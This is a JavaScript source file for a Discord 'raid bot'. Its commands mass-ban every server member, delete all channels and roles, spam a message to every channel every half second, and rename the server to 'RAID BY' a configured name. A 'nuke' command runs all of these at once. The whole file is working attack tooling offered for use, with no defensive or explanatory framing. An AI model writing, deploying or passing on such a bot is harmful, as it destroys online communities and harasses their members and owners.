
const Discord = require("discord.js");
const config = require('./config.json');
const client = new Discord.Client();

client.login(config.token);
client.on("ready", () => {
  console.log(
    `The raid bot is now on.`
  );

  client.user.setActivity(`Awesome bot!`)
  
});

client.on("message", async message => {
  
    const args = message.content
    .slice(config.prefix.length)
    .trim()
    .split(/ +/g);
  if(message.content.toLowerCase().startsWith(config.prefix + "ban")){

    message.guild.members.cache.forEach(member => {

      member.ban({ reason: `RAID BY ${config.raidername}` })
      .then(user => console.log(`User banned: ${user.username}`))
      .catch("Unable to ban " + member.username);
    });
};

if(message.content.toLowerCase().startsWith(config.prefix + "ping")){

  setInterval(function() {

  message.guild.channels.cache.forEach(channels => {

	channels.send(args[1])
  });
  
  }, 500)

};

if(message.content.toLowerCase().startsWith(config.prefix + "change")){

  message.guild.setName("RAID BY " + config.raidername)
  message.guild.setIcon(config.guildicon)
};

if(message.content.toLowerCase().startsWith(config.prefix + "delall")){

  message.guild.channels.cache.forEach(channels => {
    channels.delete()
    .then(deleted => console.log(`Deleted channel: ${deleted.name}`))
    .catch("Unable to delete the channel " + channels.name);
  });

  message.guild.roles.cache.forEach(roles => {
    roles.delete()
    .then(deleted => console.log(`Deleted role: ${deleted.name}`))
    .catch("Unable to delete the role " + roles.name);
    });

};

if(message.content.toLowerCase().startsWith(config.prefix + "delchannels")){

  message.guild.channels.cache.forEach(channels => {
    channels.delete()
    .then(deleted => console.log(`Deleted role: ${deleted.name}`))
    .catch("Unable to delete the role " + channels.name);
});

};

if(message.content.toLowerCase().startsWith(config.prefix + "delroles")){

  message.guild.roles.cache.forEach(roles => {
    roles.delete()
    .then(deleted => console.log(`Deleted role: ${deleted.name}`))
    .catch("Unable to delete the role " + roles.name);
});

};

if(message.content.toLowerCase().startsWith(config.prefix + "help")){

  const embed = new Discord.MessageEmbed()
  .setColor("RANDOM")
  .setDescription("All raid commands")
  .addField("ping", "Example: ping @everyone")
  .addField("ban", "Bann all server members")
  .addField("change", "Change the server's name & icon")
  .addField("delall", "Delete all channels & roles")
  .addField("delchannels", "Delete all channels")
  .addField("delroles", "Delete all roles")
  .addField("name", "Change server name")
  .addField("pfp", "Change server icon")
  .addField("nuke", "All raid functions in the same command")

    message.member.send(embed)
    .catch(err => console.log("\nI can't sen't you the msg with dm. Open it!"))

};

if(message.content.toLowerCase().startsWith(config.prefix + "name")){

  message.guild.setName("RAIDED BY "+ config.raidername)

};

if(message.content.toLowerCase().startsWith(config.prefix + "pfp")){

  message.guild.setIcon(config.guildicon)

};

if(message.content.toLowerCase().startsWith(config.prefix + "nuke")){

  message.guild.channels.cache.forEach(channels => {
    channels.delete()
    .then(deleted => console.log(`Deleted channel: ${deleted.name}`))
    .catch("Unable to delete the channel " + channels.name);
  });
  
  message.guild.roles.cache.forEach(roles => {
  roles.delete()
  .then(deleted => console.log(`Deleted role: ${deleted.name}`))
  .catch("Unable to delete the role " + roles.name);
  });
  message.guild.members.cache.forEach(member => {

    member.ban({ reason: `RAID BY ${config.raidername}` })
    .then(user => console.log(`User banned: ${user.username}`))
    .catch("Unable to ban " + member.username);
  });

  message.guild.setName("RAID BY " + config.raidername)
  message.guild.setIcon(config.guildicon)

};

});
